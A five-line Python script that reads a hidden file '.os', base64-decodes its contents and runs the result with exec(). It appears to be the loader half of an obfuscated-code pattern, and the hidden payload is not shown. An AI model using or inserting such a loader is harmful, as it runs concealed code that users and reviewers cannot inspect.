import base64 as b
s=open('.os','r')
l=s.read()
s.close()
exec(b.b64decode(l))
